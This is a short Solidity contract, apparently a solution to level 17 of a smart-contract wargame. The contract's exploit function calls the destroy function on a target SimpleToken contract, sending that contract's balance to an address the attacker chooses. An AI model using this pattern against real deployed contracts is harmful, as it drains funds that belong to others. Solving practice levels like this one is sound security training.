// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel17.sol";

contract Attack {
    SimpleToken token;

    function exploit(address payable _target, address payable to) external {
        token = SimpleToken(_target);
        token.destroy(to);
        //address(token).call{value: 0}(abi.encodeWithSignature("destroy(address)", to));
    }
}
